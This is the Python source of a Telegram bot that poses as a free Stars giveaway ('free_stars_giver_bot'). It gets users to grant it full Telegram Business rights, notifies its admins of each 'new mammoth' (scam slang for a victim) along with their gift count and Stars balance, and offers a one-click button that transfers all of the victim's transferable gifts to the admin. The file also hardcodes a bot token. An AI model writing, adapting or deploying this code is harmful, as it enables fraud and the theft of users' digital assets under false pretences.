import os
import json
import asyncio
import logging
from datetime import datetime

from aiogram import Bot, Dispatcher, types, F
from aiogram.enums import ParseMode
from aiogram.filters import CommandStart
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.client.default import DefaultBotProperties
import aiohttp

TOKEN = "8255986251:AAFCye2nMWU3xQkSOWs5TtQcmpKAR85By6w"
ADMIN_IDS = [1071518993]
DATA_FILE = "users.json"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = Bot(
    token=TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)
dp = Dispatcher(bot=bot)

async def call_business_method(method: str, data: dict):
    url = f"https://api.telegram.org/bot{TOKEN}/{method}"
    async with aiohttp.ClientSession() as session:
        async with session.post(url, json=data) as response:
            return await response.json()

async def get_user_gift_info(connection_id: str) -> tuple:
    try:
        response = await call_business_method("getAvailableGifts", {
            "business_connection_id": connection_id
        })
        gifts = response.get("gifts", [])
        transferable = [g for g in gifts if g.get("can_be_transferred")]

        try:
            stars_resp = await call_business_method("getBusinessStarBalance", {
                "business_connection_id": connection_id
            })
            stars = stars_resp.get("stars", 0)
        except Exception as e:
            logger.warning("Ошибка получения Stars: %s", e)
            stars = 0

        return transferable, stars
    except Exception as e:
        logger.error("Ошибка при получении подарков:", exc_info=True)
        return [], 0

@dp.message(CommandStart())
async def handle_start_fallback(message: types.Message):
    user_id = message.from_user.id
    username = message.from_user.username or "NoUsername"

    users = {}
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            try:
                users = json.load(f)
            except json.JSONDecodeError:
                users = {}

    try:
        response = await call_business_method("getBusinessConnection", {
            "user_id": user_id
        })
        await message.answer(f"<code>{json.dumps(response, indent=2, ensure_ascii=False)}</code>")

        connection_id = response.get("business_connection_id")

        if not connection_id:
            await message.answer(
                "⛔ Вы не подключили Telegram Business или не выдали все права (подарки, профиль, звёзды). "
                "Нажмите кнопку ниже, чтобы подключить бота правильно:",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(
                        text="🚀 Подключить бота",
                        url="https://t.me/business/start?bot=free_stars_giver_bot"
                    )]
                ])
            )
            return

        users[str(user_id)] = {
            "username": username,
            "connection_id": connection_id,
            "connected_at": datetime.now().isoformat(),
            "gift_ids": [],
            "stars": 0
        }

        with open(DATA_FILE, "w") as f:
            json.dump(users, f, indent=2)

        await message.answer("✅ Вы успешно подключили бота через Telegram Business! Пожалуйста, ожидайте...")

        gifts, stars = await get_user_gift_info(connection_id)
        gift_count = len(gifts)
        user_display = f"@{username}" if username != "NoUsername" else f"ID: {user_id}"

        admin_text = (
            f"👤 Новый мамонт     подключён: {user_display}\n"
            f"🆔 ID: <code>{user_id}</code>\n"
            f"🎁 Подарков для передачи: <b>{gift_count}</b>\n"
            f"⭐ Stars: <b>{stars}</b>"
        )

        buttons = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🎁 Забрать подарки", callback_data=f"takegifts:{user_id}")]
        ])

        for admin_id in ADMIN_IDS:
            try:
                await bot.send_message(chat_id=admin_id, text=admin_text, reply_markup=buttons)
            except Exception as err:
                logger.warning("Не удалось отправить сообщение админу %s: %s", admin_id, err)

    except Exception as e:
        logger.error("Ошибка при вызове getBusinessConnection:", exc_info=True)
        await message.answer("❌ Не удалось получить бизнес-подключение. Убедитесь, что вы выдали ВСЕ права и повторите.")

@dp.callback_query(F.data.startswith("takegifts:"))
async def handle_take_gifts(callback: CallbackQuery):
    admin_id = callback.from_user.id
    if admin_id not in ADMIN_IDS:
        await callback.answer("⛔ Нет доступа", show_alert=True)
        return

    user_id = callback.data.split(":")[1]
    user_data = {}

    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            try:
                user_data = json.load(f)
            except json.JSONDecodeError:
                await callback.answer("⚠️ Ошибка базы данных", show_alert=True)
                return

    user_info = user_data.get(str(user_id))
    if not user_info:
        await callback.answer("❌ Пользователь не найден", show_alert=True)
        return

    connection_id = user_info["connection_id"]
    used_gifts = set(user_info.get("gift_ids", []))

    try:
        response = await call_business_method("getAvailableGifts", {
            "business_connection_id": connection_id
        })
        gift_list = response.get("gifts", [])
        transferable = [g for g in gift_list if g.get("can_be_transferred") and g.get("id") not in used_gifts]

        if not transferable:
            await callback.answer("⛔ Нет новых подарков", show_alert=True)
            return

        success_count = 0
        for gift in transferable:
            gift_id = gift.get("id")
            try:
                await call_business_method("sendGift", {
                    "gift_id": gift_id,
                    "user_id": admin_id,
                    "text": f"🎁 Получен подарок от {user_info['username']}",
                    "business_connection_id": connection_id
                })
                success_count += 1
                used_gifts.add(gift_id)
            except Exception as e:
                logger.warning(f"Ошибка при передаче подарка {gift_id}: {e}")

        user_info["gift_ids"] = list(used_gifts)
        user_data[str(user_id)] = user_info
        with open(DATA_FILE, "w") as f:
            json.dump(user_data, f, indent=2)

        await callback.message.edit_text(
            f"✅ Забрано {success_count} подарков у {user_info['username']}",
            reply_markup=None
        )

        try:
            await bot.send_message(
                chat_id=int(user_id),
                text=f"🎁 Ваши подарки были переданы! Спасибо 🙏"
            )
        except Exception:
            pass

    except Exception as e:
        logger.error("Ошибка при обработке передачи:", exc_info=True)
        await callback.answer("❌ Ошибка передачи", show_alert=True)

if __name__ == "__main__":
    asyncio.run(dp.start_polling(bot))
